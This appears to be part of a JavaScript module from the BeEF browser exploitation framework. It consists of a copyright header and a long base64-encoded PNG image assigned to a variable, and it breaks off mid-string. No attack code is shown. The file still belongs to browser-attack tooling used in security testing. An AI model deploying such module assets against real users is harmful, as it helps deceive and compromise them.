/*
 * Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
 * Browser Exploitation Framework (BeEF) - http://beefproject.com
 * See the file 'doc/COPYING' for copying permission
 */

	imgr = 'data:image/png;base64,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